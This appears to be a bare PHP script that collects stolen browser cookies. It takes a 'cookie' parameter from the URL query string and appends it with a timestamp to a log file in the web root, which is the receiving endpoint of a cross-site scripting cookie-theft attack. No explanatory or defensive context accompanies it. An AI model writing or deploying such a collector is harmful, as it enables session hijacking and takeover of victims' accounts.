<?php
    $cookie = $_GET['cookie'];
    
    if($cookie){
        $log = date("Y-m-d H:i:s")."-".$cookie."\n";
        
        $file = fopen("/var/www/html/cookie.log","a");
        fwrite($file,$log);
        fclose($file);
    }
?>